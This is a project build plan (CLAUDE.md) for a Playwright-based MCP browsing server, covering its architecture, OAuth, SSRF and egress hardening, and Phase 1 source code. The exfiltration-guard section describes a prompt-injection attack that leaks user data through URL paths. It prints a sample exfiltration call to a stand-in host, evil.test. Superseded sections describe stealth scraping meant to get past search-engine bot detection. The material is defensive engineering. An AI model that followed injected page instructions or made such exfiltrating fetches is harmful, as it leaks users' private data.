# playwright-mcp — Build Plan

A reusable, user-scoped MCP server that gives every Claude Code project headless
Playwright browsing — `web_fetch` (stealth render + citations), the `browser_*`
debugging tools, and the `session_*` helpers — replacing Claude Code's native
WebFetch. **Web search uses Claude's native server-side WebSearch**, verified and
cited with `web_fetch` by the session-side `web-search` skill.

Modeled after `~/lab/nanobanana-mcp`: a TypeScript MCP server built to `dist/index.js`,
registered once at **user scope** so any project can use it without per-project setup.

> **⚠️ Direction change (2026-06-08) — ledger `DEC-2026-06-08-native-websearch-webfetch-doublecheck`.**
> The original plan built a scraping `web_search` tool (three-engine stealth) and a
> `deep_research` tool on top of it. Both were **removed**: scraping consumer search
> engines from the user's residential IP is an unwinnable bot-detection / IP-reputation
> arms race (diagnosed live — Google `/sorry`, DDG 403, Bing challenge, all at once;
> confirmed against SearXNG's source that engines block by IP regardless of request
> hygiene). **Reversal:** discovery now runs on Claude's native server-side `WebSearch`
> (no user-IP exposure), and `web_fetch` layers the double-check (render + CSL-JSON
> citations + page-health) on top — orchestrated session-side by the `web-search` skill
> (an MCP server cannot call native `WebSearch`). `web_fetch`, `browser_*`, and
> `session_*` are unchanged. Sections below describing `web_search`/`deep_research`/
> `src/engines/*`/the three-layer stack are **historical** — superseded by that DEC.

## Goals

1. **One install, every project.** Registered in `~/.claude.json` at user scope
   (like nanobanana-mcp), not per-project `.mcp.json`.
2. **Cross-platform install.** `install.sh` (Linux/macOS) and `install.ps1`
   (Windows PowerShell) that build the server and register it with Claude Code.
3. **Override native WebFetch; keep native WebSearch.** Deny `WebFetch` (and the
   claude-in-chrome tools) in `~/.claude/settings.json`; provide the `web_fetch`
   MCP tool so page fetches go through the Playwright stack. **Native `WebSearch`
   is NOT denied** — it is the discovery path (server-side, no IP burn), paired
   with `web_fetch` for the cited double-check via the `web-search` skill.
   *(Reversed 2026-06-08 — originally "override native WebSearch/WebFetch"; see the
   Direction-change banner above + ledger DEC-2026-06-08.)*
4. **Default browser for debugging.** Make this server the standard way Claude
   reviews sites — local dev servers and live URLs — instead of the claude-in-chrome
   extension.
5. **Replace odyssey-alive's project-scope playwright.** Migrate it off
   `npx @playwright/mcp@latest` (project scope) onto this package (user scope).

## Status (2026-06-07)

Plan only — this directory contains nothing but this CLAUDE.md. Nothing is
scaffolded, installed, or registered yet. Start at Phase 1 below.

Findings already verified against the real packages (saves a research step):

- Latest `@playwright/mcp` is **0.0.75** (what odyssey-alive's `npx @latest` resolves
  to). Its programmatic API: `createConnection(config) → Promise<Server>` —
  older docs show `{ server, close }`; that was 0.0.29. Config supports
  `secrets?: Record<string, string>` and `browser.launchOptions.headless`.
- `@playwright/mcp@0.0.75` depends on `playwright@1.61.0-alpha-1778188671000`.
  Pin this repo's direct `playwright` dependency to the **exact same version** so
  npm dedupes to one copy and one chromium binary — keep the two in lockstep on
  every upgrade.
- `@modelcontextprotocol/sdk@1.29` provides `InMemoryTransport.createLinkedPair()`
  for the in-process proxy composition described under Architecture.
- The complete Phase 1 code below **was built and compiled cleanly** against these
  exact versions on 2026-06-07, then removed to leave a docs-only repo. Use it
  verbatim as the starting point. **Caveat:** the discoverability additions
  (`buildInstructions()`, the `instructions` server option, and the smoke
  instructions assertion — added later on 2026-06-07) postdate that build and
  are **not yet compile-verified**; expect to fix minor type errors there first.

## Remote connector for claude.ai (added 2026-06-26, `extend`)

The server now optionally exposes a **remote Streamable-HTTP transport** so
**claude.ai** can use it as a custom connector, in addition to the unchanged
stdio surface. Decision + rationale: ledger
`DEC-2026-06-26-remote-streamable-http-transport-claude-ai`. Operator runbook:
**`docs/REMOTE-CONNECTOR.md`** (committed). Built + gated green via `npm run gate`
(35 tests incl. `scripts/test-remote.mjs`); live GitHub/claude.ai handshake is
verified on the deploy host, not locally.

- **Gate:** comes up only when `PLAYWRIGHT_MCP_PUBLIC_URL` is set; otherwise
  stdio-only, byte-for-byte as before. Binds `127.0.0.1:PLAYWRIGHT_MCP_PORT`
  (default 8765) behind nginx.
- **Transport** (`src/remote.ts`): `StreamableHTTPServerTransport` on express,
  stateful session map; the outward `Server` is built per binding by the
  `createOutwardServer(upstream, upstreamTools, { remote })` factory in
  `src/index.ts` (all sessions share the one upstream chromium).
- **Remote scope + trust tiers:** `web_fetch` + interactive browse +
  `browser_evaluate`. The HTTP surface has two tiers (`SurfaceTrust` in
  `src/index.ts`), and the denylist is split to match:
  - `ALWAYS_DENIED` (silent, ungated power — `browser_run_code_unsafe`,
    `browser_file_upload`, `session_scaffold_tests`, `suite_scaffold`,
    `suite_audit`) is dropped on **every** non-stdio surface.
  - `CLOUD_DENIED` (the human-gated `session_*` login/status/challenge/attach
    handoff family) is dropped on the **cloud** (public OAuth) surface only.
  - `REMOTE_DENYLIST` = their union = the cloud denylist (unchanged: claude.ai
    still drops all nine). Filtering hits **both** `tools/list` and `tools/call`.
  - **`local` tier** = the no-auth loopback surface an operator opts into with
    `PLAYWRIGHT_MCP_ALLOW_NOAUTH=1`. Gets full toolset minus `ALWAYS_DENIED`, so
    the human-gated `session_*` handoff stays available — this is what lets the
    krull-web-broker call `session_solve_challenge` for inline CAPTCHA solving.
    Each `session_*` tool opens a headed window the human must act in, so an
    injected local model can at most pop a visible window, never silently
    exfiltrate — the gate is why they're safe here but not on the cloud surface.
- **Auth** (`src/auth.ts`): proxy-mode OAuth via the SDK auth toolkit
  (`mcpAuthRouter` + an `OAuthServerProvider`), GitHub upstream; server is its own
  AS (GitHub has no DCR), locked to one `GITHUB_ALLOWED_LOGIN`. Adds `express`.
  Fails closed if `GITHUB_*` is unset (unless `PLAYWRIGHT_MCP_ALLOW_NOAUTH=1`, dev
  only). **RFC 9207 `iss`** (MCP 2026-07-28 / SEP-2468; ledger DEC-2026-07-28):
  every authorization response we emit — success *and* `access_denied` — carries
  the issuer identifier, and the AS metadata advertises
  `authorization_response_iss_parameter_supported`. The SDK emits neither, so we
  serve our own metadata router **ahead of** `mcpAuthRouter` (first express mount
  wins) and set `iss` in `gitHubCallback`. Known gap: the SDK's own late-validation
  error redirects still carry no `iss` — unfixable without forking.
- **SSRF hardening** (`src/egress.ts`): in-process backstop blocking
  metadata/localhost/RFC1918 for `web_fetch`, plus `network.blockedOrigins` on the
  wrapped browser; OS-level egress firewall is the primary control (runbook §6).
  Remote instance deploys **secrets-free**.
- **Env vars** (remote instance only): `PLAYWRIGHT_MCP_PUBLIC_URL`,
  `PLAYWRIGHT_MCP_PORT`, `GITHUB_CLIENT_ID`, `GITHUB_CLIENT_SECRET`,
  `GITHUB_ALLOWED_LOGIN`, `PLAYWRIGHT_MCP_ALLOW_NOAUTH`. Documented in `.env.example`.

## Protocol version — we stay on 2025-11-25, deliberately (2026-07-28)

MCP spec **2026-07-28** shipped a stateless core, an extensions framework (Tasks,
MCP Apps, EMA), MRTR, cacheable list responses, and auth hardening. It was
reviewed concept-by-concept — ledger **`DEC-2026-07-28-mcp-spec-2026-07-28-adoption-scope`**.
Two items were adopted (RFC 9207 `iss`, above; visible session binding, below);
everything protocol-level was **rejected for now**, for one hard reason:

> `@playwright/mcp` does not *depend* on the MCP SDK — it **bundles v1** inside
> `playwright-core` (`require('playwright-core/lib/coreBundle')`), and
> `createConnection()` is typed as returning a **v1** `Server`. SDK v2 shipped as a
> split (`@modelcontextprotocol/server@2` + `@modelcontextprotocol/client@2`) while
> `@modelcontextprotocol/sdk@1.30.0` still reports `LATEST_PROTOCOL_VERSION =
> '2025-11-25'`. **The inward half of the proxy composition cannot move to v2 until
> Microsoft rebuilds `@playwright/mcp`** — until then, adoption means running two
> SDKs and hand-writing a v1↔v2 bridge in `createOutwardServer`.

**Revisit trigger:** `@playwright/mcp` publishes on `@modelcontextprotocol/server@2.x`.
Re-run the evaluation then — and read the DEC's watch item first: under v2,
capabilities move to an optional `server/discover` RPC, so the `instructions`
capability map (the only always-visible discovery surface — see Gotchas) needs
rework **before** a migration, not during it. Do not re-litigate the rejections
without that trigger; the DEC records the reasoning for each.

## Outbound exfiltration guards (added 2026-07-29, `extend`)

`src/exfil.ts` guards the **outbound** direction: a malicious page instructing
the agent to fetch a series of URLs whose paths spell out the user's private data
one character at a time (the "Memory Heist" class). Decision + full rationale:
ledger `DEC-2026-07-29-prompt-injection-exfiltration-guards`. Implementation
contract: **`/web-fetch-method` § Outbound exfiltration guards**. Gate green via
`npm run gate` (99 tests incl. `scripts/test-exfil.mjs`).

**Read the DEC's "Explicit non-fixes" before trusting these.** They raise the
cost of one attack shape; they do not solve exfiltration, and a fetch-depth cap
in particular is not a solution — `web_fetch("https://evil.test/?d=<base64>")`
leaks everything in one call.

- **Why here:** the server holds no user memory, so it is not the *source* — it
  is the *outbound channel*, and because `settings.json` denies native `WebFetch`
  and claude-in-chrome, it is the **only** one. One chokepoint to instrument.
- **One entry point:** `guardOutbound(url, secretInventory())`, called by
  `fetchUrl()` **and** by `createOutwardServer`'s call handler for any upstream
  tool carrying an http(s) `url` argument — so `browser_navigate` cannot route
  around what `web_fetch` enforces. Order: secret scan → alphabet signature →
  per-domain velocity ledger.
- **Registrable domain, not host** (`bbc.co.uk` does not collapse to `co.uk`), so
  subdomain alphabets (`a.evil.test`, `b.evil.test`) share one bucket.
- **Loopback / RFC1918 / `.local` are exempt** from the velocity guards —
  debugging local dev servers is goal #4 and generates exactly that traffic.
  Delegates to `isBlockedHostSync` in `src/egress.ts`; note the polarity —
  `egress.ts` blocks being pointed **inward** (SSRF, remote only), `exfil.ts`
  watches what goes **outward**, on every instance.
- **Provenance framing:** `web_fetch` quarantines the document in
  `<untrusted-content>` with the warning in the *opening* tag; upstream
  `browser_*` results get the one-line `UNTRUSTED_NOTICE`
  (`withUntrustedNotice`, exported and unit-tested, beside `withSessionBanner`).
- **Session scoping:** `web_fetch({url, session})` is refused when the target's
  registrable domain is absent from that storageState's own cookie domains and
  origins — a captured identity cannot be pointed off-site.
- **Env vars** (both optional, defaults are correct): `PLAYWRIGHT_MCP_FETCH_LIMIT`,
  `PLAYWRIGHT_MCP_DISABLE_EXFIL_GUARD`. Documented in `.env.example`.
  **Deliberately not tool parameters** — an injected page can persuade the model,
  not the operator at a shell. Do not add an override argument to any schema.

## Bootstrap — Phase 1 step-by-step

Run from this directory. Steps 1–2 create files, 3–5 install/build/verify.

### 1. Init and config files

```bash
git init
```

`.gitignore` (default-ignore policy — see § Git hygiene rule below; this file
already exists in the repo, keep it current through the build):

```
# Build scaffolding — meta-tooling used to BUILD the package, not the shipped package
.claude/
CLAUDE.md

# Dependencies & build output
node_modules/
dist/

# Secrets & environment
.env
*.secret

# Temporary / working files (debug screenshots, scratch, logs, caches)
*.log
*.tmp
tmp/
scratch/
screenshots/
.cache/
```

**Git hygiene rule (2026-06-07, user directive — see ledger
DEC-2026-06-07-gitignore-default-ignore-and-no-commit):** `.gitignore` follows a
**default-ignore** policy — `.claude/`, `CLAUDE.md`, secrets, and any temporary
files created during the build are ignored; only files we **intend to commit**
(`src/`, `package.json`, `tsconfig.json`, `install.sh`, `install.ps1`,
`README.md`, `.gitignore`, `.env.example`) stay tracked. Keep `.gitignore`
current as the build creates new temp artifacts. **The assistant may run
`git commit` when asked, but NEVER `git push`** — amended 2026-07-28; the
original rule barred both. Pushing to a remote stays the user's act: a local
commit is recoverable, a push is not. The assistant still never commits
unprompted.

`package.json` (versions are deliberate — see Status notes; keep `playwright`
pinned to the exact version `@playwright/mcp` bundles):

```json
{
  "name": "@francis/playwright-mcp",
  "version": "0.1.0",
  "description": "User-scoped Playwright MCP server: full @playwright/mcp toolset plus web_search/web_fetch/deep_research tools that replace Claude Code's native WebSearch/WebFetch",
  "main": "dist/index.js",
  "type": "module",
  "bin": {
    "playwright-mcp": "./dist/index.js"
  },
  "scripts": {
    "build": "tsc",
    "dev": "tsx watch src/index.ts",
    "start": "node dist/index.js",
    "smoke": "node scripts/smoke.mjs"
  },
  "license": "MIT",
  "dependencies": {
    "@modelcontextprotocol/sdk": "^1.29.0",
    "@playwright/mcp": "0.0.75",
    "playwright": "1.61.0-alpha-1778188671000"
  },
  "devDependencies": {
    "@types/node": "^20.17.9",
    "tsx": "^4.19.2",
    "typescript": "^5.7.2"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}
```

`tsconfig.json`:

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist"]
}
```

### 2. Source

`src/index.ts` — the proxy wrapper (verified compiling against 0.0.75):

```typescript
#!/usr/bin/env node
/**
 * playwright-mcp — user-scoped MCP server wrapping @playwright/mcp (headless)
 * and adding custom tools (web_search, web_fetch, deep_research) that replace
 * Claude Code's native WebSearch/WebFetch.
 *
 * Architecture: proxy composition. The official @playwright/mcp server runs
 * in-process behind an InMemoryTransport; we connect to it as a client and
 * re-expose its full toolset over stdio, merged with our custom tools.
 *
 * IMPORTANT: never write to stdout — it carries the MCP stdio stream.
 * All logging goes to stderr.
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { createConnection } from '@playwright/mcp';
import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from '@modelcontextprotocol/sdk/types.js';

import { customTools, callCustomTool, isCustomTool } from './tools.js';

const VERSION = '0.1.0';

const log = (...args: unknown[]) => console.error('[playwright-mcp]', ...args);

/** Locate secrets.env: ~/.config/playwright-mcp/secrets.env (Linux/macOS), %APPDATA%\playwright-mcp\secrets.env (Windows). */
function secretsPath(): string {
  if (process.env.PLAYWRIGHT_MCP_SECRETS) return process.env.PLAYWRIGHT_MCP_SECRETS;
  const base =
    process.platform === 'win32'
      ? process.env.APPDATA ?? path.join(os.homedir(), 'AppData', 'Roaming')
      : process.env.XDG_CONFIG_HOME ?? path.join(os.homedir(), '.config');
  return path.join(base, 'playwright-mcp', 'secrets.env');
}

/** Minimal dotenv-style parser — KEY=value lines, # comments, optional quotes. */
function loadSecrets(): Record<string, string> | undefined {
  const file = secretsPath();
  if (!fs.existsSync(file)) return undefined;
  const secrets: Record<string, string> = {};
  for (const line of fs.readFileSync(file, 'utf8').split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    let value = trimmed.slice(eq + 1).trim();
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'")))
      value = value.slice(1, -1);
    secrets[key] = value;
  }
  log(`loaded ${Object.keys(secrets).length} secrets from ${file}`);
  return secrets;
}

/**
 * Render the server `instructions` capability map from the LIVE toolset —
 * never hand-maintained, so it cannot drift. Claude Code injects this into the
 * system prompt even when tool schemas are deferred (see CLAUDE.md Gotchas).
 * Keep the output under ~40 lines.
 */
function buildInstructions(
  upstreamTools: { name: string }[],
  custom: { name: string }[],
): string {
  const names = new Set([...upstreamTools, ...custom].map((t) => t.name));
  const lines = [
    'playwright-mcp provides headless Playwright browsing for ALL web work:',
    'reviewing/debugging local dev servers (localhost) and live sites, screenshots, and web search/fetch.',
    '',
  ];
  if (names.has('web_search') || names.has('web_fetch')) {
    lines.push(
      'REPLACES NATIVE TOOLS: use web_search instead of WebSearch and web_fetch instead of WebFetch.' +
        (names.has('deep_research') ? ' Use deep_research for multi-level cited research.' : ''),
      '',
    );
  }
  lines.push(
    'Browse/debug workflow: browser_navigate → browser_snapshot (accessibility tree; prefer over screenshots) → interact by ref (browser_click, browser_type, …) → verify.',
    'Debugging: browser_console_messages, browser_network_requests. Screenshots: browser_take_screenshot.',
    '',
    `All tools (${names.size}): ${[...names].sort().join(', ')}`,
  );
  return lines.join('\n');
}

async function main() {
  // 1. Spin up the official @playwright/mcp server in-process, headless.
  const playwrightServer = await createConnection({
    browser: {
      browserName: 'chromium',
      launchOptions: { headless: true },
    },
    secrets: loadSecrets(),
  });

  // 2. Connect to it as a client over an in-memory transport.
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await playwrightServer.connect(serverTransport);
  const upstream = new Client({ name: 'playwright-mcp-proxy', version: VERSION });
  await upstream.connect(clientTransport);

  // 3. Our outward-facing server: upstream tools + custom tools, over stdio.
  //    `instructions` is the always-visible capability map (AI discoverability —
  //    see Architecture); generated from the live toolset so it never drifts.
  const { tools: upstreamTools } = await upstream.listTools();
  const server = new Server(
    { name: 'playwright-mcp', version: VERSION },
    {
      capabilities: { tools: {} },
      instructions: buildInstructions(upstreamTools, customTools),
    },
  );

  server.setRequestHandler(ListToolsRequestSchema, async () => {
    const { tools } = await upstream.listTools();
    return { tools: [...tools, ...customTools] };
  });

  server.setRequestHandler(CallToolRequestSchema, async (request) => {
    const { name, arguments: args } = request.params;
    try {
      if (isCustomTool(name)) return await callCustomTool(name, args ?? {});
      return await upstream.callTool({ name, arguments: args ?? {} });
    } catch (err) {
      return {
        content: [{ type: 'text', text: `Error in ${name}: ${err instanceof Error ? err.message : String(err)}` }],
        isError: true,
      };
    }
  });

  await server.connect(new StdioServerTransport());
  log(`v${VERSION} ready (wrapping @playwright/mcp, headless chromium)`);
}

main().catch((err) => {
  log('fatal:', err);
  process.exit(1);
});
```

`src/tools.ts` — custom-tool registry (empty in Phase 1; Phase 2 tools plug in):

```typescript
/**
 * Custom tool registry — tools added on top of the wrapped @playwright/mcp set.
 *
 * Phase 2 adds: web_search (Google), web_fetch, deep_research.
 * Each tool lives in src/tools/<name>.ts and registers itself here.
 */

import type { Tool, CallToolResult } from '@modelcontextprotocol/sdk/types.js';

type ToolHandler = (args: Record<string, unknown>) => Promise<CallToolResult>;

interface CustomTool {
  definition: Tool;
  handler: ToolHandler;
}

// Phase 2: import and list tool modules here, e.g.:
//   import { webSearch } from './tools/web-search.js';
//   import { webFetch } from './tools/web-fetch.js';
//   import { deepResearch } from './tools/deep-research.js';
const registry: CustomTool[] = [];

export const customTools: Tool[] = registry.map((t) => t.definition);

export function isCustomTool(name: string): boolean {
  return registry.some((t) => t.definition.name === name);
}

export async function callCustomTool(
  name: string,
  args: Record<string, unknown>,
): Promise<CallToolResult> {
  const tool = registry.find((t) => t.definition.name === name);
  if (!tool) throw new Error(`unknown custom tool: ${name}`);
  return tool.handler(args);
}
```

`scripts/smoke.mjs` — verification client:

```javascript
#!/usr/bin/env node
// Smoke test: start dist/index.js over stdio, list tools, navigate to a data: URL.
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';

const transport = new StdioClientTransport({
  command: 'node',
  args: ['dist/index.js'],
  stderr: 'inherit',
});
const client = new Client({ name: 'smoke', version: '0.0.0' });
await client.connect(transport);

// Discoverability acceptance: the server must publish a non-empty instructions
// capability map. Phase 1 asserts the browser toolset is mapped; Phase 2
// extends this assertion to web_search/web_fetch.
const instructions = client.getInstructions() ?? '';
const instructionsOk = instructions.includes('browser_navigate');
console.log(instructionsOk ? 'instructions: capability map present' : 'FAIL: instructions missing or incomplete');

const { tools } = await client.listTools();
console.log(`tools (${tools.length}):`);
for (const t of tools) console.log(`  - ${t.name}`);

console.log('\nnavigating to a data: URL...');
const result = await client.callTool({
  name: 'browser_navigate',
  arguments: { url: 'data:text/html,<title>smoke-ok</title><h1>playwright-mcp smoke test</h1>' },
});
const text = result.content?.find((c) => c.type === 'text')?.text ?? '';
console.log(text.includes('smoke-ok') ? '\nPASS: navigation + snapshot working' : `\nFAIL: unexpected result:\n${text}`);

await client.close();
process.exit(text.includes('smoke-ok') && instructionsOk ? 0 : 1);
```

### 3. Install + build

```bash
npm install
npm run build                    # tsc → dist/  (compiled cleanly as of 2026-06-07)
npx playwright install chromium  # downloads the headless browser (~170 MB)
```

### 4. Verify

```bash
npm run smoke
```

Expect: `instructions: capability map present`, a list of `browser_*` tools from
the wrapped @playwright/mcp, then `PASS: navigation + snapshot working`. If
chromium is missing, the server errors on first navigation — rerun step 3's last
command. The instructions assertion is Phase 1 acceptance criteria: the server
must publish its capability map (Architecture item 3) or the smoke test fails.

### 5. Register with Claude Code (user scope)

```bash
claude mcp add --scope user playwright-mcp -- node "$(pwd)/dist/index.js"
```

Then in a *different* project directory, run `claude`, and confirm
`mcp__playwright-mcp__*` tools appear via `/mcp`. Phase 1 done — proceed to
Phase 2 (custom tools), then the installers and overrides described below.

## Current State (as of 2026-06-07)

- `~/lab/odyssey-alive` registers playwright at project scope in `~/.claude.json` →
  `projects./home/francis/lab/odyssey-alive.mcpServers.playwright`:
  `npx @playwright/mcp@latest --headless --secrets /home/francis/.config/playwright-mcp/secrets.env`
- `~/.config/playwright-mcp/secrets.env` exists (mode 600) — keep using this path.
- odyssey-alive's CLAUDE.md already says "Use Playwright, not the Chrome browser
  plugin, for visual debugging" — this package makes that rule global.
- Reference implementation for structure: `~/lab/nanobanana-mcp`
  (TypeScript, `@modelcontextprotocol/sdk`, stdio transport, `dist/index.js` entry,
  `install.sh`, registered in global `mcpServers` of `~/.claude.json`).

## Architecture

**Recommended: wrap `@playwright/mcp`, add tools on top.**

`@playwright/mcp` exports a programmatic API (`createConnection`). This server:

1. Re-exposes the full official toolset (`browser_navigate`, `browser_snapshot`,
   `browser_click`, `browser_take_screenshot`, etc.) by delegating to
   `@playwright/mcp` configured headless — we inherit upstream fixes for free.
2. Adds three custom tools the official package lacks — a **three-layer stack**
   (`web_fetch` ← `web_search` ← `deep_research`) over shared `src/` modules, so
   nothing is re-implemented up the stack:
   - **`web_fetch`** (bottom) — stealth-renders a URL (HTML **or PDF**), returns
     readable main text, **CSL-JSON citation metadata** (author/date/publisher),
     CMS detection, page-health status, and (on request) outbound links + the
     reference section. **Owns citation/CMS extraction for the whole stack**
     (`src/extract.ts`). Handles SPAs native WebFetch can't render. Method in
     `/web-fetch-method`.
   - **`web_search`** (middle) — three-engine stealth search (Google + Bing +
     DuckDuckGo, optional Google Scholar) via disguised headless Playwright, no
     engine APIs. Reads each engine's full first page, re-ranks by our own
     relevance signals (source-type + **independent-corroboration** consensus, not
     engine order), confirm-fetches the best 6 via `web_fetch` (citations flow up
     from there), returns them ranked best→worst. Method in `/web-search-method`.
   - **`deep_research`** (top) — a **mechanical** recursive gather engine: drives
     `web_search` in links-mode + `web_fetch`, harvests leads, clusters evidence,
     owns the global budget, returns organized raw material. Its **agent-driven
     paper orchestration** (a session-side skill + agent team — thesis-builder,
     gap-analyst, adversarial citation-verifier, mandatory research-assistant)
     turns that into a verified **1300–1500-word cited paper**. The MCP server has
     no LLM — all reasoning runs in the session via agents, never in the server.
     Method in `/deep-research-method`.

   Plus two thin **session helpers** for authenticated debugging (goal #4) —
   `session_login` (capture an authed session to a mode-600 `storageState` file;
   headed for 2FA/SSO) and `session_status` (validate freshness). The MCP
   authenticates **once** and emits a portable storageState artifact that both
   interactive debugging (the wrapped `browser_*` tools) and generated Playwright
   test suites consume — it never holds a live session through a test cycle.
   Method in `/session-method`.
3. **Publishes a generated capability map (AI discoverability).** The outward
   server passes an `instructions` string in its `Server` options — Claude Code
   injects it into the system prompt under "MCP Server Instructions", where it
   stays visible even when tool schemas are deferred (see Gotchas). It is
   rendered by `buildInstructions()` in `src/index.ts` from the **live** toolset
   at startup — categorized (replaces-native steering, browse/debug workflow,
   debugging, full tool list), never hand-maintained, so it cannot drift from
   what the server actually exposes. Keep it under ~40 lines. Discovery is
   three-layered and all layers ship together: tool descriptions (`tools/list`),
   the `instructions` map, and the `~/.claude/CLAUDE.md` steering directive —
   all using the same vocabulary so the directive's phrases match the tool
   surface.

Fallback if wrapping proves brittle: run a thin custom server with only
`web_search`/`web_fetch` and keep `@playwright/mcp` registered separately at user
scope. Decide during Phase 1; prefer the single-package wrap.

### Stack

- TypeScript, ESM (`"type": "module"`), Node ≥ 18
- `@modelcontextprotocol/sdk` — stdio server
- `@playwright/mcp` + `playwright` (chromium only — keep install light)
- Tool descriptions matter: `web_search` and `web_fetch` descriptions should
  explicitly say they replace built-in WebSearch/WebFetch so the model reaches for
  them naturally.

### Repo layout

```
playwright-mcp/
├── src/
│   ├── index.ts          # server entry: wrap @playwright/mcp + register custom tools
│   ├── tools.ts          # custom-tool registry (list + dispatch)
│   ├── tools/
│   │   ├── web-search.ts     # middle layer: 3-engine SERP + rank
│   │   ├── web-fetch.ts      # bottom layer: stealth render + citations (HTML/PDF)
│   │   ├── deep-research.ts  # top layer: recursive gather engine (mechanical)
│   │   └── session.ts        # session_login / session_status (storageState capture + freshness)
│   ├── engines/          # per-engine SERP scrapers, isolated selectors
│   │   ├── google.ts
│   │   ├── bing.ts
│   │   ├── duckduckgo.ts
│   │   └── scholar.ts
│   ├── browser.ts        # shared stealth chromium context (launch once, reuse)
│   ├── extract.ts        # readability + CSL-JSON citations + CMS + links/refs (web_fetch owns)
│   ├── score.ts          # source-type classifier + scholarly boost + consensus (shared)
│   ├── cache.ts          # short-TTL SERP/page cache (politeness + speed)
│   └── budget.ts         # global fetch/search budget accounting (deep_research)
├── scripts/
│   └── smoke.mjs         # stdio client: list tools, navigate a data: URL
├── dist/                 # build output (committed or built by installer)
├── install.sh            # Linux/macOS installer
├── install.ps1           # Windows PowerShell installer
├── .env.example
├── package.json          # bin: { "playwright-mcp": "./dist/index.js" }
├── tsconfig.json
├── CLAUDE.md             # this file
└── README.md
```

## Installers

Both scripts do the same four steps:

1. Check Node ≥ 18, install deps (`npm ci || npm install`), build (`npm run build`).
2. `npx playwright install chromium` (download the headless browser).
3. Register at user scope:
   `claude mcp add --scope user playwright-mcp -- node <abs-path>/dist/index.js`
   (idempotent: `claude mcp remove --scope user playwright-mcp` first, ignore failure).
4. Apply the WebSearch/WebFetch override (next section) — prompt before touching
   `~/.claude/settings.json`; print a diff of what changed.

Platform notes:
- `install.sh`: bash, resolve own dir via `cd "$(dirname "$0")" && pwd`.
- `install.ps1`: PowerShell 5.1+ compatible (Windows ships 5.1), use
  `$PSScriptRoot`, no bashisms.
- Secrets file: respect `~/.config/playwright-mcp/secrets.env` on Linux/macOS,
  `$env:APPDATA\playwright-mcp\secrets.env` on Windows; pass via `--secrets` /
  env var to the wrapped server.

## `web_fetch` method — stealth render + citation extraction (bottom layer)

Implementation spec in the **`/web-fetch-method` skill**
(`.claude/skills/web-fetch-method/SKILL.md`). Read it before writing or
maintaining `src/tools/web-fetch.ts` (Phase 2). It covers: the shared stealth
context, the HTML **and PDF** render paths, page-health classification, the
CSL-JSON citation priority chain (JSON-LD → OG → Dublin Core → byline) with a
`dateConfidence` flag, CMS detection, link/reference harvesting (for
`deep_research`), the `quality: fast|research` agent escalation (the
source-appraiser agent), and the return shape. **web_fetch owns
citation/CMS/PDF extraction for the whole stack** (`src/extract.ts`) — the layers
above it never re-extract.

## `web_search` method — three-engine stealth search (middle layer)

Implementation spec moved to the **`/web-search-method` skill**
(`.claude/skills/web-search-method/SKILL.md`). Read that skill before writing or
maintaining `src/tools/web-search.ts` (Phase 2). It covers: the own stealth
browser context (shared with `web_fetch`), the manual disguise layer + debug
parity harness, the three engines and their selectors, per-engine relevance
re-ranking, source-type + consensus weighting, the confirm-fetch pass with
failure backfill, the `mode: links|confirm` and `quality: fast|research`
(relevance-adjudicator agent) parameters, the return shape, and the tool
description wording. Citations flow up from `web_fetch` — this layer doesn't
re-extract them. Note: the engines are **independent fail-soft sources**, not a
Google-primary-with-DDG-fallback chain.

## `deep_research` method — recursive gather engine + agent-driven paper (top layer)

Implementation spec moved to the **`/deep-research-method` skill**
(`.claude/skills/deep-research-method/SKILL.md`). Read that skill before writing
or maintaining `src/tools/deep-research.ts` (Phase 2) **or** the `research-paper`
orchestration skill. It covers two parts: (1) the **mechanical tool** —
`deep_research(query, depth, breadth, scholarly, quality)`, the three-level
survey → follow-leads → verify loop driving `web_search` in **links-mode** + 
`web_fetch`, lead harvesting, cross-level dedup, **evidence clustering**, the
global budget/caps and **until-dry** gap-loop termination, and the raw-material
output; and (2) the **agent-driven orchestration** — the session-side team
(thesis-builder, gap-analyst, adversarial citation-verifier, mandatory
research-assistant; unique personas) that develops a thesis, fills gaps,
drafts a **1300–1500-word paper**, and verifies every citation (no citation
without a fetched source). All reasoning runs in the session via agents, never in
the server.

## `session_login` / `session_status` method — authenticated debugging (goal #4)

Implementation spec in the **`/session-method` skill**
(`.claude/skills/session-method/SKILL.md`). Read it before writing or maintaining
`src/tools/session.ts` (Phase 2). It covers the **storageState-artifact model**:
the MCP authenticates **once** (`session_login` — headless from `secrets.env`, or
**headed** for 2FA/SSO) and writes a mode-600 storageState file under
`~/.config/playwright-mcp/sessions/`; both interactive debugging (the wrapped
`browser_*` tools, optionally on a persistent `userDataDir`) and **generated
Playwright test suites** (the standard setup-project + `dependencies` pattern)
load that artifact. **The test-suite half is materialized** (extend,
DEC-2026-06-08-e2e-test-scaffold-storagestate, amended): `templates/e2e/` +
a shared generator core (`src/scaffold.ts`) generate the suite into any project
via either the **`session_scaffold_tests`** MCP tool (the discoverable front door)
or the `npm run scaffold:e2e` CLI — `auth.setup.ts` is a freshness guard (not a
re-login), the config resolves `storageState` via the same precedence as
`src/secrets.ts` with a `STORAGE_STATE` CI hatch, surfaced in the
`buildInstructions()` map + the `session_login` description. `session_status` validates freshness before reuse. Key
principle: **the MCP never holds a live session through a test cycle** (its
lifetime ≠ the test run's) — it emits a portable artifact. The auth context is
isolated from the stealth `web_search`/`web_fetch` context; storageState files
